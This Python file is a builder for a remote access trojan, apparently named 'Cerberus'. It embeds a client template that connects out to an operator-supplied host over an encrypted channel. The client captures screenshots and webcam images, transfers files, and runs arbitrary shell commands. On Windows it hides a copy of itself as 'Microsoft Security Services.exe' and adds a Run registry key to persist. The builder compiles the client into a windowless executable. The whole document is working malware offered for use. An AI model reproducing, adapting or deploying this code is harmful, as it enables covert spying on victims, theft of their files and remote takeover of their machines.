template = """import socket
import cv2
import os
import time
import sys
from struct import pack, unpack
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from PIL import Image, ImageGrab
from threading import Thread
import subprocess

PACKAGE_SIZE = 15000
HOST_ADDRESS = '%HOST_ADDRESS%'
HOST_PORT = %HOST_PORT%


def connect_to_host(host_address=HOST_ADDRESS, host_port=HOST_PORT):
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    public = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
    host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host.connect((host_address, host_port))
    host.send(public)
    fernet_key = private_key.decrypt(host.recv(1024), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
    fernet = Fernet(fernet_key)
    return host, fernet


def send_data(data, connection, fernet):
    if type(data) != bytes: data = data.encode()

    data = fernet.encrypt(data)
    length = pack('>Q', len(data))

    connection.sendall(length)
    connection.sendall(data)

    ack = connection.recv(1)


def receive_data(connection, fernet):
    bs = connection.recv(8)
    (length,) = unpack('>Q', bs)
    data = b''
    while len(data) < length:
        to_read = length - len(data)
        data += connection.recv(
            4096 if to_read > 4096 else to_read)

    connection.sendall(b'\00')

    data = fernet.decrypt(data)

    return data


def screenshot(compress):
    screenshot = ImageGrab.grab()
    qual = 100
    if compress: qual = 50
    screenshot.save(temp_path + 'pic_scr.png', quality=qual, optimize=True)
    file = open(temp_path + 'pic_scr.png', 'rb')
    data = file.read()
    file.close()
    os.remove(temp_path + 'pic_scr.png')
    return data


def webcam(compress):
    camera = cv2.VideoCapture(0)
    for i in range(30):
        camera.read()
    r, image = camera.read()
    qual = 0
    if compress: qual = 5
    cv2.imwrite(temp_path + 'pic_cam.png', image)
    data = open(temp_path + 'pic_cam.png', 'rb').read()
    os.remove(temp_path + 'pic_cam.png')
    return data


def list_directory(path):
    files = os.listdir(path)
    types = {}
    for file in files:
        if os.path.isdir(path + file):
            types[file] = 'directory'
            continue
        types[file] = 'file'
    return str(types).encode()


def receive_commands(host, fernet):
    while True:
        try:
            cmd = receive_data(host, fernet).decode()
            if cmd == 'screenshot':
                data = screenshot(False)
            elif cmd == 'webcam':
                data = webcam(False)
            elif cmd[:3] == 'get':
                path = cmd.split()[1]
                file = open(path, 'rb')
                data = file.read()
                file.close()
            elif cmd[:4] == 'send':
                path = cmd.split()[1]
                file = open(path, 'wb')
                send_data(os.urandom(PACKAGE_SIZE), host, fernet)
                file_data = receive_data(host, fernet)
                data = os.urandom(PACKAGE_SIZE)
                file.write(file_data)
                file.close()
            elif cmd == 'platform':
                if sys.platform == 'win32':
                    cp = subprocess.check_output('chcp', shell=True, stderr=subprocess.STDOUT).split()[-1].decode()
                    data = (f'{sys.platform}%%%%{os.environ["USERPROFILE"]}%%%%{os.path.abspath(sys.argv[0])}%%%%{cp}').encode()
                else:
                    data = (f'{sys.platform}%%%%{os.environ["HOME"]}%%%%{os.path.abspath(sys.argv[0])}').encode()
            elif cmd == 'whereami':
                data = os.path.abspath(sys.argv[0]).encode()
            else:
                data = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=10, shell=True)
        except Exception as exception:
            data = ('Error occured:' + str(exception)).encode()
        send_data(data, host, fernet)


if sys.platform == 'win32':
    import winreg
    temp_path = f'{os.environ["USERPROFILE"]}\\Documents\\Windows Security Manager\\'
    os.popen('mkdir "%USERPROFILE%\\Documents\\Windows Security Manager"')
    os.popen(f'copy {sys.argv[0]} "%USERPROFILE%\\Documents\\Windows Security Manager\\Microsoft Security Services.exe"')
    os.popen(f'attrib +h "%USERPROFILE%\\Documents\\Windows Security Manager\\Microsoft Security Services.exe"')
    os.popen(f'attrib +h "%USERPROFILE%\\Documents\\Windows Security Manager"')
    path = f'"{os.environ["USERPROFILE"]}\\Documents\\Windows Security Manager\\Microsoft Security Services.exe"'
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    reg_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(reg_key, "Microsoft Security Services", 0, winreg.REG_SZ, path)
    winreg.CloseKey(reg_key)
else:
    temp_path = f'{os.environ["HOME"]}/'


while True:
    try:
        host, fernet = connect_to_host()
        receive_commands(host, fernet)
    except:
        time.sleep(5)"""

import os, sys

host_ip = input('IP address of server: ')
port = input('Cerberus port: ')
filename = input('File name: ')
icon = input('Path to icon(.ico file, leave empty for default executable icon): ')
if icon == '': icon = 'NONE'

open(filename + '.py', 'w').write(template.replace('%HOST_ADDRESS%', host_ip).replace('%HOST_PORT%', port))

if input('Install dependencies?(cv2, cryptography, pillow, pyinstaller. Recommended on first run)[y/n]: ') == 'y':
    print('Installing dependencies...')
    os.system('pip install opencv-python cryptography pillow pyinstaller')
else:
    print('Skipped dependencies installation.')
os.system(f'pyinstaller --onefile --noconsole -i {icon} {filename}.py')
if sys.platform == 'win32':
    slash = '\\'
    extension = '.exe'
else:
    slash = '/'
    extension = ''
print(f'Completed! Saved executable to .{slash}dist{slash}{filename}{extension}')